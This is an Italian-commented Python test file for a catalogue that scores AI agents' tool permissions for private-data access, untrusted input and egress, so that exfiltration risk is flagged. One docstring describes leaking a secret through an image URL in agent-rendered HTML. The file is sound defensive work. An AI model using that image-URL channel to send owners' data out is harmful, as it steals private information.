"""Test della CLASSIFICAZIONE spedita in `catalogs/trifecta.yaml`.

Separato da `test_trifecta.py` di proposito: là si prova il **motore** (match
dei pattern, eccezioni, chiusura del contesto) su config sintetiche; qui si
prova il **dato versionato** che l'istanza carica davvero. Sono due cose che
si rompono per ragioni diverse — il motore per una regressione di codice, il
catalogo per un verbo rinominato nel gateway — e vale la pena vederlo dal
nome del file che fallisce.

Contenuto: le quattro correzioni di clodia-platform#104 §9 («correzione del
catalogo», propedeutica all'EPIC). La classificazione v1 era stata scritta sui
nomi PRESUNTI dei verbi; questi test la ancorano all'elenco EFFETTIVO del
gateway, così la correzione non può tornare indietro in silenzio.
"""
from __future__ import annotations

import unittest
from types import SimpleNamespace

from . import trifecta


def _spec(name, tools=()):
    return SimpleNamespace(
        name=name, type="normal", tool_permissions=list(tools),
        sandbox=SimpleNamespace(allow_shell_cmds=[], deny_shell_patterns=[]),
    )


def _legs(verb: str) -> dict:
    return trifecta.agent_profile(_spec("x", [verb]))["legs"]


def _score(verb: str) -> int:
    return trifecta.agent_profile(_spec("x", [verb]))["score"]


class ListDirTests(unittest.TestCase):
    """§9.1 — `fs.list_dir` è un falso positivo."""

    def test_list_dir_alone_lights_nothing(self) -> None:
        # Verificato in clodia-tools `server/tools/fs.py`: ritorna nomi, tipo e
        # dimensione dentro `allowed_paths`, mai il contenuto di un file.
        # Nove agenti avevano un lato contato per errore (#104 §9).
        self.assertEqual(_score("fs.list_dir"), 0)

    def test_the_namespace_stays_classified_for_future_verbs(self) -> None:
        # L'eccezione è puntuale, non una cancellazione del namespace: un
        # `fs.read_file` futuro sarebbe lettura vera e deve accendere il lato.
        self.assertTrue(_legs("fs.*")["private_data"])


class ThirdPartyConnectorTests(unittest.TestCase):
    """§9.2 — i connettori non erano classificati affatto."""

    WRITES = ("gcalendar.create_event", "gcalendar.update_event",
              "gcalendar.delete_event", "gdocs.create", "gdocs.append_text",
              "gdocs.replace_text", "trello.create_card", "trello.comment",
              "trello.move_card", "image.generate", "gdrive.mkdir",
              "gdrive.move", "artifact.render", "mcp.add", "packs.import_url",
              "packs.install_npm", "packs.install_pip",
              "gsheets.add_tab", "gsheets.append_rows", "gsheets.write_range")

    READS = ("gcalendar.list_events", "gcalendar.freebusy", "gdocs.read",
             "trello.cards", "trello.boards", "trello.lists",
             "gsheets.read", "gsheets.list_tabs")

    def test_writes_towards_third_parties_are_egress(self) -> None:
        # Il difetto originale: un agente con SOLI questi verbi risultava 0/3
        # pur potendo esfiltrare.
        for verb in self.WRITES:
            with self.subTest(verb=verb):
                legs = _legs(verb)
                self.assertTrue(legs["egress"], f"{verb} non è classificato come uscita")
                self.assertFalse(legs["private_data"], f"{verb} non legge nulla")

    def test_reads_are_private_and_untrusted_but_not_egress(self) -> None:
        # Calendario, documenti e board contengono sia dati dell'owner sia testo
        # scritto da terzi (invitati, collaboratori del doc, membri della board).
        for verb in self.READS:
            with self.subTest(verb=verb):
                legs = _legs(verb)
                self.assertTrue(legs["private_data"])
                self.assertTrue(legs["untrusted_input"])
                self.assertFalse(legs["egress"], f"{verb} è una lettura, non un'uscita")

    def test_render_is_egress_even_though_it_writes_inside_clodia(self) -> None:
        """`artifact.render` scrive in `files/artifact.html`, quindi per la
        regola generale del catalogo («la scrittura dentro Clodia non è egress»)
        sembrerebbe innocuo. Non lo è: l'HTML finisce in un iframe nel browser
        dell'owner e la CSP di `ArtifactCanvas.svelte` consente
        `img-src … https:` con `script-src 'unsafe-inline'`, quindi una
        `<img src="https://…/?d=SEGRETO">` parte come GET. Il canale è il
        browser, non il file: è il motivo per cui questa voce va documentata,
        altrimenti al prossimo giro qualcuno la toglie in buona fede."""
        self.assertTrue(_legs("artifact.render")["egress"])

    def test_gsheets_namespace_covers_verbs_added_later(self) -> None:
        """`gsheets.*` is classified as a namespace, not verb by verb, on purpose.

        The gap found in #104 §9 was connectors added without touching this
        catalogue: an agent holding only those verbs scored 0/3 while it could
        exfiltrate. A future `gsheets.delete_tab` must light up on its own.
        """
        legs = _legs("gsheets.some_future_read")
        self.assertTrue(legs["private_data"])
        self.assertTrue(legs["untrusted_input"])

    def test_rename_is_deliberately_in_no_leg(self) -> None:
        # Scrittura di solo metadato: non legge contenuto e non ne fa uscire.
        # `gdrive.move` invece sì — può spostare su uno Shared Drive.
        self.assertEqual(_score("gdrive.rename"), 0)
        self.assertTrue(_legs("gdrive.move")["egress"])


class PhantomVerbTests(unittest.TestCase):
    """§9.3 — eccezioni scritte su verbi che non esistono."""

    PHANTOMS = {"email.send_file", "telegram.send_message",
                "gdrive.create", "gdrive.write", "gdrive.put"}

    def test_no_leg_mentions_a_phantom_verb(self) -> None:
        cfg = trifecta.load_config(force=True)
        for leg in (*trifecta.LEGS, "expansion"):
            with self.subTest(leg=leg):
                mentioned = self.PHANTOMS & (set(cfg[leg]["include"])
                                             | set(cfg[leg]["exclude"]))
                self.assertFalse(mentioned,
                                 f"'{leg}' cita verbi inesistenti: {sorted(mentioned)}")

    def test_reply_is_egress(self) -> None:
        # Buco non previsto dall'issue, emerso riallineando all'elenco reale:
        # `email.reply` risponde in thread CON allegati locali ed era in nessun
        # lato, quindi non accendeva l'uscita.
        legs = _legs("email.reply")
        self.assertTrue(legs["egress"])
        self.assertFalse(legs["private_data"])

    def test_the_real_send_verbs_are_all_egress(self) -> None:
        for verb in ("email.send", "email.reply", "telegram.send",
                     "telegram.send_file"):
            with self.subTest(verb=verb):
                self.assertTrue(_legs(verb)["egress"])


class LeaseTests(unittest.TestCase):
    """§9.4 — `telegram.lease_*` è controllo d'accesso, non lettura."""

    def test_lease_verbs_light_nothing(self) -> None:
        for verb in ("telegram.lease_acquire", "telegram.lease_release"):
            with self.subTest(verb=verb):
                self.assertEqual(_score(verb), 0)

    def test_a_postino_with_a_lease_stays_egress_only(self) -> None:
        # È il caso misurato in #102: il lease gonfiava il punteggio di un
        # agente che non legge niente.
        p = trifecta.agent_profile(
            _spec("postino", ["telegram.send", "telegram.send_file",
                              "telegram.lease_acquire", "telegram.lease_release"]))
        self.assertEqual(p["score"], 1)
        self.assertTrue(p["legs"]["egress"])


class OpenQuestionTests(unittest.TestCase):
    """Scelte deliberate che NON sono state prese qui: il test le rende
    visibili invece di lasciarle implicite in un'assenza."""

    def test_leads_is_private_data_only(self) -> None:
        """#104 §8 decide che `leads.*` è dato privato, e tanto si applica.

        NON è anche `untrusted_input`, benché un lead da form web sia contenuto
        di terzi: `leads.*` è un MCP esterno come `normattiva.*`,
        `contabilita.*` e `sedia.*`, e quei namespace restano non classificati
        perché #102 ha misurato i seed senza di essi. Classificarne uno solo
        introdurrebbe un'asimmetria silenziosa: la decisione va presa insieme.
        """
        legs = _legs("leads.list")
        self.assertTrue(legs["private_data"])
        self.assertFalse(legs["untrusted_input"])

    def test_domain_mcps_are_still_unclassified(self) -> None:
        # Se un domani vengono classificati, questo test fallisce e obbliga a
        # rileggere i numeri di #102 invece di lasciarli invecchiare in silenzio.
        for verb in ("normattiva.search", "contabilita.list", "sedia.search"):
            with self.subTest(verb=verb):
                self.assertEqual(_score(verb), 0)


class PatternHygieneTests(unittest.TestCase):
    """Invariante strutturale del catalogo, indipendente dai singoli verbi."""

    def test_no_pattern_uses_a_partial_wildcard(self) -> None:
        """`_split` riconosce solo `*` e `ns.*`: un pattern come
        `packs.install_*` o `telegram.lease_*` non matcha NULLA.

        È la classe di errore più insidiosa qui, perché un pattern morto *sembra*
        funzionare: non solleva errori, non compare nei log, abbassa soltanto il
        punteggio. È anche la forma in cui verrebbe naturale scrivere le voci
        aggiunte da questa correzione — da cui il test.
        """
        cfg = trifecta.load_config(force=True)
        for leg in (*trifecta.LEGS, "expansion"):
            for field in ("include", "exclude"):
                for pattern in cfg[leg][field]:
                    with self.subTest(leg=leg, field=field, pattern=pattern):
                        _, verb = trifecta._split(pattern)
                        self.assertTrue(
                            verb == "*" or "*" not in verb,
                            f"'{pattern}' usa un glob parziale: non matcha nulla")

    def test_every_exception_is_covered_by_an_include_of_the_same_leg(self) -> None:
        """Un'eccezione che non ricade sotto nessun `include` del suo lato non
        toglie niente: o il pattern è sbagliato, o l'include è stato rimosso e
        l'eccezione è rimasta orfana."""
        cfg = trifecta.load_config(force=True)
        for leg in (*trifecta.LEGS, "expansion"):
            for excluded in cfg[leg]["exclude"]:
                with self.subTest(leg=leg, pattern=excluded):
                    self.assertTrue(
                        any(trifecta._overlap(excluded, inc)
                            for inc in cfg[leg]["include"]),
                        f"'-{excluded}' in '{leg}' non ha un include che lo copra")

    def test_the_shipped_catalog_is_the_one_being_tested(self) -> None:
        # Guardia contro un test verde su un catalogo vuoto (es. file spostato).
        cfg = trifecta.load_config(force=True)
        self.assertGreaterEqual(cfg["version"], 2)
        for leg in trifecta.LEGS:
            self.assertTrue(cfg[leg]["include"], f"lato '{leg}' senza pattern")


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
